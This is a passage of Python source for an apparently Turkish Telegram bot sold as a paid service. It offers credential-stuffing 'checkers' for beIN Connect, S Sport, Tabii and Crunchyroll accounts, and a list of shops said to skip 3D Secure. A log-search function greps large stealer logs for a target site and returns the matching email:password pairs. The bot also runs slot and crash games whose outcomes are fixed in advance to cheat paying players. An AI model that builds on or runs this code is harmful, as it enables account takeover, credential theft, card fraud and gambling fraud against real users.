    bot.send_message(chat_id, "📡 **beIN Connect Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: login / paket\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_ssport":
    safe_answer()
    if user_id in active_ssport_jobs and not active_ssport_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif SSPORT var."); return
    user_states[chat_id] = "waiting_ssport"
    bot.send_message(chat_id, "🏟 **S Sport Plus Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: isim · tel · paket\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_tabii":
    safe_answer()
    if user_id in active_tabii_jobs and not active_tabii_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif TABII var."); return
    user_states[chat_id] = "waiting_tabii"
    bot.send_message(chat_id, "📺 **Tabii Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: ad · premium\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_crunchyroll":
    safe_answer()
    if user_id in active_crunchyroll_jobs and not active_crunchyroll_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif CRUNCHYROLL var."); return
    user_states[chat_id] = "waiting_crunchyroll"
    bot.send_message(
      chat_id,
      "🍥 **Crunchyroll Checker**\n\n"
      + _proxy_status_line(user_id) + "\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: plan · streams · ülke · süre\n"
      "🛑 Durdur var · Proxy: Checker menü\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_3dsiz":
    safe_answer()
    if not feature_3dsiz_enabled:
      bot.send_message(chat_id, "❌ **3D'siz Site Bul** özelliği şu anda admin tarafından kapatılmıştır.", parse_mode="Markdown")
      return
    sites_text = (
      "🔍 **3D'siz Site Bul**\n\n"
      "Aşağıda bilinen 3D Secure (3DS) istemeyen / düşük 3DS oranlı bazı siteler listelenmiştir.\n"
      "⚠️ Listeler zamanla değişebilir, kendi sorumluluğunuzdadır.\n\n"
      "🛒 **Örnek Siteler:**\n"
      "• Trendyol (bazı satıcılar)\n"
      "• Hepsiburada (kısmi)\n"
      "• N11 (kısmi)\n"
      "• Amazon TR (bazı ürünler)\n"
      "• ÇiçekSepeti\n"
      "• Mediamarkt / Teknosa (kısmi)\n\n"
      "💡 Daha güncel liste için admin ile iletişime geçin.\n"
      "🔄 Özellik admin panelden istediği zaman açılıp kapatılabilir."
    )
    markup = types.InlineKeyboardMarkup().add(
      types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal")
    )
    try:
      bot.edit_message_text(sites_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, sites_text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_toggle_telz":
    if user_id not in admin_ids_set:
      safe_answer("Yetkin yok.", show_alert=True)
      return
    feature_telz_enabled = not feature_telz_enabled
    save_data()
    status = "AÇIK ✅" if feature_telz_enabled else "BAKIMDA 🔧"
    safe_answer(f"Telz: {status}", show_alert=True)
    try:
      bot.send_message(chat_id, f"📞 **Telz Call** durumu: **{status}**", parse_mode="Markdown")
    except Exception:
      pass
    log_activity("toggle_telz", user_id, status)

  elif call.data == "admin_toggle_3dsiz":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    feature_3dsiz_enabled = not feature_3dsiz_enabled
    save_data()
    status = "AÇIK ✅" if feature_3dsiz_enabled else "KAPALI ❌"
    safe_answer(f"3D'siz Site Bul: {status}", show_alert=True)
    try:
      bot.send_message(chat_id, f"🔍 **3D'siz Site Bul** özelliği artık: **{status}**", parse_mode="Markdown")
    except:
      pass
    log_activity("toggle_3dsiz", user_id, status)

  elif call.data.startswith("star_approve_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    pay_id = call.data.replace("star_approve_", "")
    req = pending_star_payments.get(pay_id)
    if not req:
      safe_answer("❌ Talep bulunamadı veya zaten işlendi.", show_alert=True)
      return
    if req.get("status") != "pending":
      safe_answer(f"❌ Bu talep zaten: {req.get('status')}", show_alert=True)
      return
    target_uid = int(req["user_id"])
    tl_amount = float(req["amount_tl"])
    user_balances[target_uid] = user_balances.get(target_uid, 0.0) + tl_amount
    req["status"] = "approved"
    req["approved_by"] = user_id
    req["approved_time"] = get_current_time_str()
    pending_star_payments[pay_id] = req
    add_balance_history(target_uid, "star_topup", tl_amount, f"Stars pay {pay_id}")
    log_activity("star_approve", user_id, f"{pay_id}:{tl_amount} to {target_uid}")
    save_data()
    safe_answer("✅ Bakiye eklendi!", show_alert=True)
    try:
      bot.edit_message_text(
        f"✅ **ONAYLANDI**\n\nTalep `{pay_id}`\n👤 `{target_uid}`\n💵 **+{tl_amount:.0f} TL** eklendi.\nAdmin: `{user_id}`",
        chat_id, call.message.message_id, parse_mode="Markdown"
      )
    except:
      pass
    try:
      bot.send_message(
        target_uid,
        f"🎉 **Bakiye Yüklemeniz Onaylandı!**\n\n💵 **+{tl_amount:.0f} TL** bakiyenize eklendi.\n🆔 Talep: `{pay_id}`\n💳 Yeni Bakiye: **{user_balances[target_uid]:.2f} TL**",
        parse_mode="Markdown"
      )
      add_notification(target_uid, f"+{tl_amount:.0f} TL yıldız yükleme onaylandı")
    except:
      pass

  elif call.data.startswith("star_reject_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    pay_id = call.data.replace("star_reject_", "")
    req = pending_star_payments.get(pay_id)
    if not req:
      safe_answer("❌ Talep bulunamadı.", show_alert=True)
      return
    if req.get("status") != "pending":
      safe_answer(f"❌ Bu talep zaten: {req.get('status')}", show_alert=True)
      return
    req["status"] = "rejected"
    req["rejected_by"] = user_id
    req["rejected_time"] = get_current_time_str()
    pending_star_payments[pay_id] = req
    log_activity("star_reject", user_id, pay_id)
    save_data()
    safe_answer("❌ Reddedildi.", show_alert=True)
    try:
      bot.edit_message_text(
        f"❌ **REDDEDİLDİ**\n\nTalep `{pay_id}`\n👤 `{req['user_id']}`\n💵 {req['amount_tl']:.0f} TL\nAdmin: `{user_id}`",
        chat_id, call.message.message_id, parse_mode="Markdown"
      )
    except:
      pass
    try:
      bot.send_message(
        int(req["user_id"]),
        f"❌ **Bakiye yükleme talebiniz reddedildi.**\n🆔 Talep: `{pay_id}`\n💵 {req['amount_tl']:.0f} TL\n\nAdmin ile iletişime geçin.",
        parse_mode="Markdown"
      )
    except:
      pass

  elif call.data == "admin_24h_activity":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    now = time.time()
    cutoff = now - 86400
    recent = activity_logs[-300:]
    from collections import Counter
    actions = Counter()
    users = Counter()
    for log in recent:
      actions[log.get("action", "?")] += 1
      users[log.get("user_id", 0)] += 1
    top_users = users.most_common(10)
    top_actions = actions.most_common(10)
    text = "📊 **Son Aktivite Özeti (log kuyruğu)**\n\n"
    text += "**Aksiyonlar:**\n"
    for a, c in top_actions:
      text += f"• {a}: **{c}**\n"
    text += "\n**En aktif kullanıcılar:**\n"
    for u, c in top_users:
      text += f"• `{u}`: **{c}** işlem\n"
    text += f"\n💰 Toplam normal bakiye havuzu: **{sum(user_balances.values()):.0f} TL**\n"
    text += f"🎲 Toplam kumar bakiyesi: **{sum(user_gamble_balances.values()):.0f} TL**\n"
    text += f"👥 Kayıtlı: **{len(registered_users)}** | Ban: **{len(banned_users)}**"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, text[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_bulk_ban":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_bulk_ban"
    bot.send_message(chat_id, "🚫 **Toplu Ban**\nBanlanacak Telegram ID'leri yazın (her satıra bir ID veya boşluk/virgülle):", parse_mode="Markdown")
    return

  elif call.data == "admin_bulk_del_bal":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_bulk_del_bal"
    bot.send_message(chat_id, "🗑️ **Toplu Bakiye Sil**\nBakiyesi sıfırlanacak ID'leri yazın (her satıra bir / boşluk/virgül):", parse_mode="Markdown")
    return

  elif call.data == "admin_ref_week":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    from collections import Counter
    ref_counts = Counter(user_referrers.values())
    top = ref_counts.most_common(15)
    text = "🏆 **Referans Sıralaması (tüm zamanlar)**\n\n"
    if not top:
      text += "Henüz referans yok."
    for i, (uid, cnt) in enumerate(top, 1):
      text += f"#{i} `{uid}` — **{cnt}** davet\n"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, text[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_pending_stars":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    pending = {k: v for k, v in pending_star_payments.items() if v.get("status") == "pending"}
    if not pending:
      bot.send_message(chat_id, "📭 Bekleyen yıldız ödemesi yok.")
      return
    for pay_id, req in list(pending.items())[:20]:
      markup = types.InlineKeyboardMarkup(row_width=2)
      markup.add(
        types.InlineKeyboardButton("✅ Onayla", callback_data=f"star_approve_{pay_id}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"star_reject_{pay_id}")
      )
      bot.send_message(
        chat_id,
        f"⭐ Talep `{pay_id}`\n👤 `{req['user_id']}` (@{req.get('username','?')})\n💵 {req['amount_tl']:.0f} TL | ⭐ {req['stars']}\n🕐 {req.get('time','')}",
        reply_markup=markup,
        parse_mode="Markdown"
      )

def run_auto_slot(chat_id, user_id, bet):
  active_auto_slots[chat_id] = True
  emojis = ["🍒", "🍋", "🍊", "🍇", "🔔", "💎", "7️⃣", "⭐", "🍀", "❌"]
  markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 Durdur", callback_data="stop_auto_slot"))
  msg = bot.send_message(chat_id, f"🎰 **Slot Başlatıldı!**\nÇevriliyor...", reply_markup=markup, parse_mode="Markdown")

  while active_auto_slots.get(chat_id, False):
    bakiye = get_gamble_bal(user_id)
    if bakiye < bet:
      bot.send_message(chat_id, f"❌ Kumar bakiyesi yetersiz. Durduruldu.")
      break

    add_gamble_bal(user_id, -bet)
    add_to_jackpot(bet)
    update_quest(user_id, "slot")
    add_xp(user_id, 2)
    slot_play_counts[user_id] = slot_play_counts.get(user_id, 0) + 1
    if slot_play_counts[user_id] >= 10:
      grant_achievement(user_id, "slot_10")

    allow_win = gamble_allow_win_slot(user_id)
    if allow_win:
      if random.random() < float(globals().get("SLOT_TRIPLE_CHANCE", 0.08)):
        sym = random.choice(emojis[:5])
        r1 = r2 = r3 = sym
        win = bet * float(globals().get("SLOT_TRIPLE_PAYOUT", 2.2))
        text = f"[{r1} | {r2} | {r3}]\n💎 **ÜÇLÜ!** +{win:.2f} TL"
      else:
        sym = random.choice(emojis[:6])
        other = random.choice([e for e in emojis if e != sym])
        order = [sym, sym, other]
        random.shuffle(order)
        r1, r2, r3 = order
        pay = random.choice(list(globals().get("SLOT_PAYOUTS", (1.15, 1.25, 1.35, 1.45, 1.55))))
        win = bet * float(pay)
        text = f"[{r1} | {r2} | {r3}]\n✨ **Kazandın!** +{win:.2f} TL"
      add_gamble_bal(user_id, win)
      update_gambling_profit(user_id, win - bet)
    else:
      while True:
        r1, r2, r3 = random.choice(emojis), random.choice(emojis), random.choice(emojis)
        if len({r1, r2, r3}) == 3:
          break
      update_gambling_profit(user_id, -bet)
      text = f"[{r1} | {r2} | {r3}]\n😢 **Kaybettin!** -{bet} TL"

    save_data()
    try: bot.edit_message_text(f"🎰 {text}\n🎲 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**", chat_id, msg.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass
    time.sleep(2.4)

  active_auto_slots.pop(chat_id, None)

def run_interactive_zeplin(chat_id, user_id, bet):
  """Zeplin: görünür ilerleme + yüksek kazanç şansı."""
  allow_win = gamble_allow_win(user_id)
  if allow_win:
    crash_at = round(random.uniform(1.90, 4.80), 2)
    if random.random() < 0.12:
      crash_at = round(random.uniform(4.80, 7.50), 2)  # jackpot hissi
  else:
    crash_at = round(random.uniform(1.18, 1.55), 2)

  game = {
    "bet": float(bet),
    "multiplier": 1.00,
    "game_over": False,
    "crash_at": crash_at,
    "msg_id": None,
    "chat_id": chat_id,
  }
  active_zeplin_games[user_id] = game

  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton("💰 Parayı Çek (1.00x)", callback_data="zeplin_cash_out"))
  try:
    msg = bot.send_message(
      chat_id,
      f"🚀 **ZEPLİN KALKTI!**\n\n"
      f"Bahis: **{bet:.2f} TL**\n"
      f"📈 Çarpan: **1.00x**\n\n"
      f"Yükselirken **Parayı Çek**!",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    game["msg_id"] = msg.message_id
    active_zeplin_games[user_id] = game
  except Exception:
    active_zeplin_games.pop(user_id, None)
    return

  current_mult = 1.00
  tick = 0
  while True:
    time.sleep(0.65)
    game = active_zeplin_games.get(user_id)
    if not game or game.get("game_over"):
      break
    tick += 1
    step = random.uniform(0.12, 0.38)
    if tick <= 2:
      step = random.uniform(0.08, 0.18)  # yumuşak start
    current_mult = round(current_mult + step, 2)
    game["multiplier"] = current_mult
    active_zeplin_games[user_id] = game

    if current_mult >= float(game.get("crash_at") or crash_at):
      game["game_over"] = True
      active_zeplin_games[user_id] = game
      update_gambling_profit(user_id, -bet)
      save_data()
      try:
        bot.edit_message_text(
          f"💥 **ZEPLİN PATLADI!**\n\n"
          f"Patlama: **{game.get('crash_at', crash_at)}x**\n"
          f"😢 Kaybedilen: **-{bet:.2f} TL**\n"
          f"🎲 Kumar bakiyesi: **{get_gamble_bal(user_id):.2f} TL**",
          chat_id,
          game.get("msg_id") or msg.message_id,
          parse_mode="Markdown",
        )
      except Exception:
        pass
      active_zeplin_games.pop(user_id, None)
      break

    potential_win = bet * current_mult
    markup = types.InlineKeyboardMarkup()
    markup.add(
      types.InlineKeyboardButton(
        f"💰 Çek {potential_win:.2f} TL | {current_mult}x",
        callback_data="zeplin_cash_out",
      )
    )
    try:
      bot.edit_message_text(
        f"🚀 **ZEPLİN YÜKSELİYOR**\n\n"
        f"Bahis: **{bet:.2f} TL**\n"
        f"📈 Çarpan: **{current_mult}x**\n"
        f"💵 Olası: **{potential_win:.2f} TL**\n\n"
        f"⏰ İstediğin an **Parayı Çek**!",
        chat_id,
        game.get("msg_id") or msg.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
      )
    except Exception:
      time.sleep(0.35)

def _run_log_search(chat_id, user_id, target_url, search_files, charged):
  """10GB+ loglarda da çalışır. Sonuç: 2 dosya — RAW (URL'li) + CLEAN (mail:pass)."""
  import subprocess
  max_matches = 500000
  temp_clean = f"sonuc_clean_{user_id}.txt"
  temp_raw = f"sonuc_raw_{user_id}.txt"
  match_count = 0
  raw_unique = 0
  raw_hits = 0
  files_ok = 0
  files_err = 0
  files_timeout = 0
  seen_clean = set()
  seen_raw = set()
  total_files = len(search_files) or 1
  progress_msg_id = None
  try:
    pm = bot.send_message(
      chat_id,
      f"⏳ Tarama başladı\n📁 0/{total_files} kaynak\n🔍 `{target_url}`",
      parse_mode="Markdown",
    )
    progress_msg_id = getattr(pm, "message_id", None)
  except Exception:
    progress_msg_id = None

  def _progress(i, fpath, extra=""):
    nonlocal progress_msg_id
    if not progress_msg_id:
      return
    try:
      name = os.path.basename(fpath)[:40]
      try:
        sz = format_bytes(os.path.getsize(fpath))
      except Exception:
        sz = "?"
      bot.edit_message_text(
        f"⏳ Taranıyor **{i}/{total_files}**\n"
        f"📄 `{name}` ({sz})\n"
        f"✅ Clean: **{match_count:,}** · Raw: **{raw_unique:,}** · Ham: **{raw_hits:,}**\n"
        f"{extra}",
        chat_id,
        progress_msg_id,
        parse_mode="Markdown",
      )
    except Exception:
      pass

  def _record(ln, out_clean, out_raw):
    nonlocal match_count, raw_unique, raw_hits
    raw_hits += 1
    ln = (ln or "").strip()
    if not ln:
      return 0
    added = 0
    rk = ln.lower()[:800]
    if rk not in seen_raw:
      seen_raw.add(rk)
      out_raw.write(ln[:4000] + "\n")
      raw_unique += 1
      added += 1
    cleaned_ln = strip_url_keep_mail_pass(ln)
    if cleaned_ln:
      ck = cleaned_ln.lower()
      if ck not in seen_clean:
        seen_clean.add(ck)
        out_clean.write(cleaned_ln + "\n")
        match_count += 1
        added += 1
    return added

  try:
    with open(temp_clean, "w", encoding="utf-8", errors="ignore") as out_clean, \
       open(temp_raw, "w", encoding="utf-8", errors="ignore") as out_raw:
      for fi, fpath in enumerate(search_files, 1):
        if match_count >= max_matches and raw_unique >= max_matches:
          break
        _progress(fi, fpath)
        got = 0
        try:
          try:
            fsize_mb = os.path.getsize(fpath) / (1024 * 1024)
          except Exception:
            fsize_mb = 1.0
          grep_timeout = min(7200, max(300, int(fsize_mb * 2) + 180))
          env = os.environ.copy()
          env["LC_ALL"] = "C"
          proc = subprocess.run(
            ["grep", "-a", "-i", "-F", "--", target_url, fpath],
            capture_output=True,
            timeout=grep_timeout,
            env=env,
          )
          if proc.returncode in (0, 1):
            text_out = proc.stdout.decode("utf-8", errors="ignore")
            if text_out:
              for ln in text_out.splitlines():
                if match_count >= max_matches and raw_unique >= max_matches:
                  break
                got += _record(ln, out_clean, out_raw)
            files_ok += 1
            _progress(fi, fpath, f"✓ +{got} yeni")
            continue
        except subprocess.TimeoutExpired:
          files_timeout += 1
          log_error(f"log_search_timeout:{os.path.basename(fpath)}", Exception(f"timeout {grep_timeout}s"))
          _progress(fi, fpath, "⚠️ timeout — kısmi atlandı")
        except FileNotFoundError:
          pass
        except OSError as e:
          log_error(f"log_search_os:{os.path.basename(fpath)}", e)

        try:
          needle = target_url.encode("utf-8", errors="ignore").lower()
          buf_size = 16 * 1024 * 1024
          with open(fpath, "rb") as f:
            leftover = b""
            while match_count < max_matches or raw_unique < max_matches:
              chunk = f.read(buf_size)
              if not chunk and not leftover:
                break
              data = leftover + (chunk or b"")
              if chunk:
                parts = data.split(b"\n")
                leftover = parts[-1]
                lines_b = parts[:-1]
              else:
                lines_b = [data] if data else []
                leftover = b""
              for lb in lines_b:
                if match_count >= max_matches and raw_unique >= max_matches:
                  break
                if needle not in lb.lower():
                  continue
                try:
                  ln = lb.decode("utf-8", errors="ignore").strip()
                except Exception:
                  continue
                got += _record(ln, out_clean, out_raw)
          files_ok += 1
        except Exception as e:
          files_err += 1
          log_error(f"log_search_file:{os.path.basename(fpath)}", e)
  except Exception as e:
    log_error("log_search", e)
    _refund_log_search(user_id, charged)
    try:
      bot.send_message(chat_id, f"❌ Arama hatası: {e}")
    except Exception:
      pass
    for tf in (temp_clean, temp_raw):
      try:
        if os.path.exists(tf):
          os.remove(tf)
      except Exception:
        pass
    return

  try:
    if progress_msg_id:
      bot.edit_message_text(
        f"✅ Tarama bitti\n📁 {files_ok}/{total_files} · ⏱ timeout: {files_timeout}\n"
        f"🧹 Clean: **{match_count:,}** · 📄 Raw: **{raw_unique:,}** · 🔍 Ham: **{raw_hits:,}**",
        chat_id,
        progress_msg_id,
        parse_mode="Markdown",
      )
  except Exception:
    pass

  if match_count == 0 and raw_unique == 0:
    try:
      log_search_last.pop(user_id, None)
      save_data()
    except Exception:
      pass
    _refund_log_search(user_id, charged)
    try:
      bot.send_message(
        chat_id,
        f"📭 **Sonuç yok** — `{target_url}`\n"
        f"📁 Kaynak: **{files_ok}** · hata: {files_err} · timeout: {files_timeout}\n"
        f"🔍 Ham satır: **{raw_hits}**",
        parse_mode="Markdown",
      )
    except Exception:
      pass
    for tf in (temp_clean, temp_raw):
      try:
        if os.path.exists(tf):
          os.remove(tf)
      except Exception:
        pass
    return

  truncated_note = ""
  if match_count >= max_matches or raw_unique >= max_matches:
    truncated_note = f"\n⚠️ Üst sınır: **{max_matches:,}**"
  to_note = f"\n⚠️ **{files_timeout}** dosya timeout" if files_timeout else ""
  summary = (
    f"📋 `{target_url}`\n"
    f"🧹 Clean (URL silinmiş): **{match_count:,}**\n"
    f"📄 Raw (URL'li ham): **{raw_unique:,}**\n"
    f"🔍 Tarama: **{raw_hits:,}** · 📁 **{files_ok}/{total_files}**"
    f"{to_note}{truncated_note}\n"
    f"📎 2 dosya: `clean` + `raw`"
  )
  try:
    bot.send_message(chat_id, summary, parse_mode="Markdown")
  except Exception:
    pass

  try:
    if match_count > 0 and os.path.exists(temp_clean) and os.path.getsize(temp_clean) > 0:
      with open(temp_clean, "rb") as doc:
        bot.send_document(
          chat_id, doc,
          caption=f"🧹 CLEAN — URL silinmiş · **{match_count:,}** satır\n`mail:pass` / `user:pass`",
          parse_mode="Markdown",
        )
  except Exception as e:
    try:
      bot.send_message(chat_id, f"❌ Clean dosya gönderilemedi: {e}")
    except Exception:
      pass

  try:
    if raw_unique > 0 and os.path.exists(temp_raw) and os.path.getsize(temp_raw) > 0:
      with open(temp_raw, "rb") as doc:
        bot.send_document(
          chat_id, doc,
          caption=f"📄 RAW — URL silinmeden · **{raw_unique:,}** satır\nHam log satırları",
          parse_mode="Markdown",
        )
  except Exception as e:
    try:
      bot.send_message(chat_id, f"❌ Raw dosya gönderilemedi: {e}")
    except Exception:
      pass

  for tf in (temp_clean, temp_raw):
    try:
      if os.path.exists(tf):
        os.remove(tf)
    except Exception:
      pass

@bot.pre_checkout_query_handler(func=lambda query: True)
def process_pre_checkout(pre_checkout_query):
  try:
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
  except Exception as e:
    log_error("pre_checkout", e)
    try:
      bot.answer_pre_checkout_query(pre_checkout_query.id, ok=False, error_message="Ödeme doğrulanamadı.")
    except:
      pass

def send_mybot_star_invoice(chat_id, user_id, stars=None):
  """Kendi bot baglama — 50 yildiz (tek seferlik)."""
  stars = int(stars if stars is not None else globals().get("MYBOT_STAR_COST", 50))
  if stars < 1:
    stars = 50
  payload = f"mybot_{user_id}_{stars}_{int(time.time())}"
  prices = [types.LabeledPrice(label=f"Kendi Bot ({stars}⭐)", amount=stars)]
  try:
    bot.send_invoice(
      chat_id,
      title=f"Kendi Bot Bagla ({stars}⭐)",
      description=(
        f"Kendi Telegram botunu baglama hakki. "
        f"{stars} yildiz, tek seferlik. "
        f"Odeme sonrasi token ekleyebilirsin."
      ),
      invoice_payload=payload,
      provider_token="",
      currency="XTR",
      prices=prices,
      start_parameter=f"mybot{stars}",
    )
    bot.send_message(
      chat_id,
      f"⭐ **Kendi bot faturasi**\n"
      f"**{stars} Yildiz** (tek seferlik)\n"
      f"✅ Odeyince token ekleme acilir.",
      parse_mode="Markdown",
    )
    return True
  except Exception as e:
    log_error("mybot_star_invoice", e)
    try:
      bot.send_message(chat_id, f"❌ Fatura gonderilemedi: {e}")
    except Exception:
      pass
    return False

def send_tempmail_star_invoice(chat_id, user_id, stars=None):
  """Geçici mail için yıldız faturası — her sefer TEMPMAIL_STAR_COST."""
  stars = int(stars if stars is not None else TEMPMAIL_STAR_COST)
  if stars < 1:
    stars = int(TEMPMAIL_STAR_COST)
  payload = f"tempmail_{user_id}_{stars}_{int(time.time())}"
  prices = [types.LabeledPrice(label=f"Geçici Mail ({stars}⭐)", amount=stars)]
  try:
    bot.send_invoice(
      chat_id,
      title=f"Geçici Mail ({stars}⭐)",
      description=(
        f"NAPİM CHK geçici mail. "
        f"Her yeni mail {stars} yıldız. "
        f"Ödeme sonrası random mail adresi oluşturulur."
      ),
      invoice_payload=payload,
      provider_token="",
      currency="XTR",
      prices=prices,
      start_parameter=f"tmail{stars}",
    )
    bot.send_message(
      chat_id,
      f"⭐ **Geçici mail faturası**\n"
      f"**{stars} Yıldız** → 1 yeni mail\n"
      f"✅ Ödeyince adres otomatik gelir.",
      parse_mode="Markdown",
    )
    return True
  except Exception as e:
    log_error("tempmail_star_invoice", e)
    try:
      bot.send_message(chat_id, f"❌ Fatura gönderilemedi: {e}")
    except Exception:
      pass
    return False

def send_star_invoice(chat_id, user_id, stars):
  """Yıldız faturası — normal bakiye. 1⭐ = STAR_TL_PER_STAR TL."""
  stars = int(stars)
  tl = float(stars) * float(STAR_TL_PER_STAR)
  payload = f"star_{user_id}_{stars}_{int(time.time())}"
  prices = [types.LabeledPrice(label=f"{tl:.0f} TL Bakiye ({stars}⭐)", amount=stars)]
  try:
    bot.send_invoice(
      chat_id,
      title=f"{tl:.0f} TL Bakiye ({stars}⭐)",
      description=(
        f"NAPİM CHK bakiye yükleme. "
        f"{stars} Yıldız = {tl:.0f} TL. "
        f"Ödeme başarılı olunca bakiye otomatik eklenir."
      ),
      invoice_payload=payload,
      provider_token="",
      currency="XTR",
      prices=prices,
      start_parameter=f"stars{stars}",
    )
    bot.send_message(
      chat_id,
      f"⭐ Fatura gönderildi.\n"
      f"**{stars} Yıldız** → **{tl:.0f} TL** bakiye\n"
      f"✅ Ödeyince otomatik yüklenir.",
      parse_mode="Markdown",
    )
    return True
  except Exception as e:
    log_error("star_invoice", e)
    try:
      bot.send_message(chat_id, f"❌ Fatura gönderilemedi: {e}")
    except Exception:
      pass
    return False

def send_star_claim_invoice(chat_id, user_id, claimed_stars):
  """Admine yıldız gönderdim — 1⭐ onay. Bakiye = claimed * STAR_ADMIN_CLAIM_RATE (1⭐=3 TL)."""
  claimed_stars = int(claimed_stars)
  rate = float(STAR_ADMIN_CLAIM_RATE)
  tl = float(claimed_stars) * rate
  ts = int(time.time())
  payload = f"starclaim_{user_id}_{claimed_stars}_{ts}"
  prices = [types.LabeledPrice(label=f"Onay: {claimed_stars}⭐ → {tl:.0f} TL", amount=1)]
  try:
    bot.send_invoice(
      chat_id,
      title=f"Onay 1⭐ — {claimed_stars}⭐ talep",
      description=(
        f"Admine {claimed_stars} yıldız gönderdiğini onaylıyorsun. "
        f"Onay sonrası +{tl:.0f} TL (1⭐={rate:.0f} TL). Bu fatura sadece 1 yıldızdır."
      ),
      invoice_payload=payload,
      provider_token="",
      currency="XTR",
      prices=prices,
      start_parameter=f"starclaim{claimed_stars}",
    )
    bot.send_message(
      chat_id,
      f"👤 **Admin onay talebi**\n\n"
      f"⭐ İddia: **{claimed_stars} yıldız** → **{tl:.0f} TL**\n"
      f"💱 Kur: 1⭐ = **{rate:.0f} TL**\n"
      f"💳 Onay için **1 ⭐** öde (yukarıdaki fatura).\n"
      f"Admin onaylarsa bakiyene **+{tl:.0f} TL** eklenir.\n"
      f"Alıcı: **{STAR_RECEIVER_USERNAME}**",
      parse_mode="Markdown",
    )
    return True
  except Exception as e:
    log_error("star_claim_invoice", e)
    try:
      bot.send_message(chat_id, f"❌ Onay faturası gönderilemedi: {e}")
    except Exception:
      pass
    return False

def send_star_gamble_invoice(chat_id, user_id, stars):
  """Yıldız faturası — kumar bakiyesi. 100⭐ = 1000 kumar (1⭐ = STAR_GAMBLE_PER_STAR)."""
  stars = int(stars)
  gamble_amt = float(stars) * float(STAR_GAMBLE_PER_STAR)
  payload = f"stargamble_{user_id}_{stars}_{int(time.time())}"
  prices = [types.LabeledPrice(label=f"{gamble_amt:.0f} Kumar ({stars}⭐)", amount=stars)]
  try:
    bot.send_invoice(
      chat_id,
      title=f"{gamble_amt:.0f} Kumar Bakiyesi ({stars}⭐)",
      description=(
        f"NAPİM CHK kumar bakiyesi. "
        f"{stars} Yıldız = {gamble_amt:.0f} kumar. "
        f"Kur: 100⭐ = 1000 kumar. Ödeme sonrası otomatik eklenir."
      ),
      invoice_payload=payload,
      provider_token="",
      currency="XTR",
      prices=prices,
      start_parameter=f"sgamble{stars}",
    )
    bot.send_message(
      chat_id,
      f"🎲 **Kumar bakiyesi faturası** gönderildi.\n"
      f"**{stars} Yıldız** → **{gamble_amt:.0f}** kumar bakiyesi\n"
      f"💱 100⭐ = 1000 kumar\n"
      f"✅ Ödeyince otomatik yüklenir.",
      parse_mode="Markdown",
    )
    return True
  except Exception as e:
    log_error("star_gamble_invoice", e)
    try:
      bot.send_message(chat_id, f"❌ Fatura gönderilemedi: {e}")
    except Exception:
      pass
    return False

def casino_again_markup(user_id):
  """Mini App tekrar ac — guncel bakiye URL'de."""
  markup = types.InlineKeyboardMarkup()
  url = (KUMAR_V2_URL or "").strip()
  if url:
    join = "&" if ("?" in url) else "?"
    wa = f"{url}{join}b={get_gamble_bal(user_id):.2f}&uid={user_id}&t={int(time.time())}"
    try:
      markup.add(types.InlineKeyboardButton("🎰 Tekrar oyna", web_app=types.WebAppInfo(url=wa)))
    except Exception:
      markup.add(types.InlineKeyboardButton("🎰 Casino", callback_data="menu_kumar_v2"))
  else:
    markup.add(types.InlineKeyboardButton("🎰 Casino", callback_data="menu_kumar_v2"))
  return markup

def process_casino_v2_play(user_id, chat_id, game, bet, choice=""):
  """Casino Mini App — slot carpanlari, blackjack, rulet, bilmece."""
  game = (game or "").strip().lower()
  choice = (choice or "").strip().lower()
  try:
    bet = float(bet)
  except Exception:
    try:
      bot.send_message(chat_id, "❌ Bahis geçersiz.")
    except Exception:
      pass
    return
  if bet <= 0:
    bot.send_message(chat_id, "❌ Bahis geçersiz.")
    return
  if MAX_GAMBLE_BET is not None and bet > float(MAX_GAMBLE_BET) and user_id not in admin_ids_set:
